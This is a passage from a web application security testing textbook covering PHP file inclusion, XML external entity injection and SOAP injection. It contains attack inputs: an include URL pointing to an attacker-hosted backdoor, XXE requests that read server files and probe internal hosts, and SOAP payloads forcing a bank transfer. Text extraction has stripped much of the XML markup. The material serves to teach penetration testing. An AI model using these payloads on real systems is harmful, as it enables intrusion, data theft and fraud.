relevant start directory as a new logical drive and using the associated drive
letter to access its contents.
The application should integrate its defenses against path traversal attacks
with its logging and alerting mechanisms. Whenever a request is received that
contains path traversal sequences, this indicates likely malicious intent on the
user’s part. The application should log the request as an attempted security
breach, terminate the user’s session, and, if applicable, suspend the user’s account
and generate an alert to an administrator.
File Inclusion Vulnerabilities
Many scripting languages support the use of include fi les. This facility enables
developers to place reusable code components into separate fi les and to include
these within function-specifi c code fi les as and when they are needed. The code
within the included fi le is interpreted just as if it had been inserted at the loca-
tion of the include directive.
Remote File Inclusion
The PHP language is particularly susceptible to fi le inclusion vulnerabilities
because its include functions can accept a remote fi le path. This has been the
basis of numerous vulnerabilities in PHP applications.
Consider an application that delivers different content to people in different
locations. When users choose their location, this is communicated to the server
via a request parameter, as follows:
https://wahh-app.com/main.php?Country=US
The application processes the Country parameter as follows:
$country = $_GET[‘Country’];
include( $country . ‘.php’ );
This causes the execution environment to load the fi le US.php that is located
on the web server fi lesystem. The contents of this fi le are effectively copied into
the main.php fi le and executed.
cc1100..iinndddd 338811 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 382
382 Chapter 10 n Attacking Back-End Components
An attacker can exploit this behavior in different ways, the most serious of
which is to specify an external URL as the location of the include fi le. The PHP
include function accepts this as input, and the execution environment retrieves
the specifi ed fi le and executes its contents. Hence, an attacker can construct
a malicious script containing arbitrarily complex content, host this on a web
server he controls, and invoke it for execution via the vulnerable application
function. For example:
https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor
Local File Inclusion
In some cases, include fi les are loaded on the basis of user-controllable data, but
it is not possible to specify a URL to a fi le on an external server. For example,
if user-controllable data is passed to the ASP function Server.Execute, an
attacker may be able to cause an arbitrary ASP script to be executed, provided
that this script belongs to the same application as the one that is calling the
function.
In this situation, you may still be able to exploit the application’s behavior to
perform unauthorized actions:
n There may be server-executable fi les on the server that you cannot access
through the normal route. For example, any requests to the path /admin
may be blocked through application-wide access controls. If you can cause
sensitive functionality to be included into a page that you are authorized
to access, you may be able to gain access to that functionality.
n There may be static resources on the server that are similarly protected
from direct access. If you can cause these to be dynamically included
into other application pages, the execution environment typically simply
copies the contents of the static resource into its response.
Finding File Inclusion Vulnerabilities
File inclusion vulnerabilities may arise in relation to any item of user-supplied
data. They are particularly common in request parameters that specify a lan-
guage or location. They also often arise when the name of a server-side fi le is
passed explicitly as a parameter.
cc1100..iinndddd 338822 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 383
Chapter 10 n Attacking Back-End Components 383
HACK STEPS
To test for remote fi le inclusion fl aws, follow these steps:
1. Submit in each targeted parameter a URL for a resource on a web server
that you control, and determine whether any requests are received from
the server hosting the target application.
2. If the first test fails, try submitting a URL containing a nonexistent IP
address, and determine whether a timeout occurs while the server
attempts to connect.
3. If the application is found to be vulnerable to remote file inclusion, con-
struct a malicious script using the available APIs in the relevant language,
as described for dynamic execution attacks.
Local fi le inclusion vulnerabilities can potentially exist in a much wider
range of scripting environments than those that support remote fi le inclu-
sion. To test for local fi le inclusion vulnerabilities, follow these steps:
1. Submit the name of a known executable resource on the server, and
determine whether any change occurs in the application’s behavior.
2. Submit the name of a known static resource on the server, and determine
whether its contents are copied into the application’s response.
3. If the application is vulnerable to local file inclusion, attempt to access
any sensitive functionality or resources that you cannot reach directly via
the web server.
4. Test to see if you can access files in other directories using the traversal
techniques described previously.
Injecting into XML Interpreters
XML is used extensively in today’s web applications, both in requests and
responses between the browser and front-end application server and in mes-
sages between back-end application components such as SOAP services. Both
of these locations are susceptible to attacks whereby crafted input is used to
interfere with the operation of the application and normally perform some
unauthorized action.
cc1100..iinndddd 338833 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 384
384 Chapter 10 n Attacking Back-End Components
Injecting XML External Entities
In today’s web applications, XML is often used to submit data from the client
to the server. The server-side application then acts on this data and may return
a response containing XML or data in any other format. This behavior is most
commonly found in Ajax-based applications where asynchronous requests are
used to communicate in the background. It can also appear in the context of
browser extension components and other client-side technologies.
For example, consider a search function that, to provide a seamless user
experience, is implemented using Ajax. When a user enters a search term, a
client-side script issues the following request to the server:
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 44
nothing will change
The server’s response is as follows (although vulnerabilities may exist regard-
less of the format used in responses):
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 81
No results found for expression: nothing will
change
The client-side script processes this response and updates part of the user
interface with the results of the search.
When you encounter this type of functionality, you should always check for
XML external entity (XXE) injection. This vulnerability arises because standard
XML parsing libraries support the use of entity references. These are simply a
method of referencing data either inside or outside the XML document. Entity
references should be familiar from other contexts. For example, the entities
corresponding to the  characters are as follows:
&lt;
&gt;
The XML format allows custom entities to be defi ned within the XML docu-
ment itself. This is done within the optional DOCTYPE element at the start of the
document. For example:
 ]>
cc1100..iinndddd 338844 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 385
Chapter 10 n Attacking Back-End Components 385
If a document contains this defi nition, the parser replaces any occurrences
of the &testref; entity reference within the document with the defi ned value,
testrefvalue.
Furthermore, the XML specifi cation allows entities to be defi ned using exter-
nal references, the value of which is fetched dynamically by the XML parser.
These external entity defi nitions use the URL format and can refer to external
web URLs or resources on the local fi lesystem. The XML parser fetches the
contents of the specifi ed URL or fi le and uses this as the value of the defi ned
entity. If the application returns in its response any parts of the XML data that
use an externally defi ned entity, the contents of the specifi ed fi le or URL are
returned in the response.
External entities can be specifi ed within the attacker’s XML-based request
by adding a suitable DOCTYPE element to the XML (or by modifying the element
if it already exists). An external entity reference is specifi ed using the SYSTEM
keyword, and its defi nition is a URL that may use the file: protocol.
In the preceding example, the attacker can submit the following request, which
defi nes an XML external entity that references a fi le on the server’s fi lesystem:
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115
 ]>
&xxe;
This causes the XML parser to fetch the contents of the specifi ed fi le and to
use this in place of the defi ned entity reference, which the attacker has used
within the SearchTerm element. Because the value of this element is echoed in
the application’s response, this causes the server to respond with the contents
of the fi le, as follows:
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 556
No results found for expression: ; for 16-bit app
support
[fonts]
[extensions]
[mci extensions]
[files]
...
TRY IT!
http://mdsec.net/search/128/
cc1100..iinndddd 338855 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 386
386 Chapter 10 n Attacking Back-End Components
In addition to using the file: protocol to specify resources on the local
fi lesystem, the attacker can use protocols such as http: to cause the server to
fetch resources across the network. These URLs can specify arbitrary hosts,
IP addresses, and ports. They may allow the attacker to interact with network
services on back-end systems that cannot be directly reached from the Internet.
For example, the following attack attempts to connect to a mail server running
on port 25 on the private IP address 192.168.1.1:
 ]>
&xxe;
This technique may allow various attacks to be performed:
n The attacker can use the application as a proxy, retrieving sensitive content
from any web servers that the application can reach, including those running
internally within the organization on private, nonroutable address space.
n The attacker can exploit vulnerabilities on back-end web applications,
provided that these can be exploited via the URL.
n The attacker can test for open ports on back-end systems by cycling through
large numbers of IP addresses and port numbers. In some cases, timing
differences can be used to infer the state of a requested port. In other
cases, the service banners from some services may actually be returned
within the application’s responses.
Finally, if the application retrieves the external entity but does not return this
in responses, it may still be possible to cause a denial of service by reading a
fi le stream indefi nitely. For example:
 ]>
Injecting into SOAP Services
Simple Object Access Protocol (SOAP) is a message-based communications
technology that uses the XML format to encapsulate data. It can be used to
share information and transmit messages between systems, even if these run
on different operating systems and architectures. Its primary use is in web
services. In the context of a browser-accessed web application, you are most
likely to encounter SOAP in the communications that occur between back-end
application components.
SOAP is often used in large-scale enterprise applications where individual tasks
are performed by different computers to improve performance. It is also often
found where a web application has been deployed as a front end to an existing
application. In this situation, communications between different components
may be implemented using SOAP to ensure modularity and interoperability.
cc1100..iinndddd 338866 88//1199//22001111 1122::1100::4488 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 387
Chapter 10 n Attacking Back-End Components 387
Because XML is an interpreted language, SOAP is potentially vulnerable to
code injection in a similar way as the other examples already described. XML
elements are represented syntactically, using the metacharacters , and /. If
user-supplied data containing these characters is inserted directly into a SOAP
message, an attacker may be able to interfere with the message’s structure and
therefore interfere with the application’s logic or cause other undesirable effects.
Consider a banking application in which a user initiates a funds transfer
using an HTTP request like the following:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65
FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
In the course of processing this request, the following SOAP message is sent
between two of the application’s back-end components:
18281008
1430
False
08447656
Note how the XML elements in the message correspond to the parameters
in the HTTP request, and also the addition of the ClearedFunds element. At
this point in the application’s logic, it has determined that insuffi cient funds
are available to perform the requested transfer and has set the value of this
element to False. As a result, the component that receives the SOAP message
does not act on it.
In this situation, there are various ways in which you could seek to inject
into the SOAP message and therefore interfere with the application’s logic. For
example, submitting the following request causes an additional ClearedFunds
element to be inserted into the message before the original element (while
preserving the SQL’s syntactic validity). If the application processes the fi rst
ClearedFunds element it encounters, you may succeed in performing a transfer
when no funds are available:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
cc1100..iinndddd 338877 88//1199//22001111 1122::1100::4499 PPMM
Stuttard c10.indd V2 - 07/05/2011 Page 388
388 Chapter 10 n Attacking Back-End Components
Content-Length: 119
FromAccount=18281008&Amount=1430True
1430&ToAccount=08447656&Submit=Submit
On the other hand, if the application processes the last ClearedFunds element
it encounters, you could inject a similar attack into the ToAccount parameter.
A different type of attack would be to use XML comments to remove part of
the original SOAP message and replace the removed elements with your own.
For example, the following request injects a ClearedFunds element via the Amount
parameter, provides the opening tag for the ToAccount element, opens a com-
ment, and closes the comment in the ToAccount parameter, thus preserving the
syntactic validity of the XML:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 125
FromAccount=18281008&Amount=1430True
08447656&Submit=Submit
A further type of attack would be to attempt to complete the entire SOAP
message from within an injected parameter and comment out the remainder
of the message. However, because the opening comment will not be matched
by a closing comment, this attack produces strictly invalid XML, which many
XML parsers will reject. This attack is only likely to work against a custom,
homegrown XML parser, rather than any XML parsing library:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 176
FromAccount=18281008&Amount=1430True
08447656
<!--&Submit=Submit
TRY IT!
This example contains a helpful error message that enables you to fi ne-
tune your attack: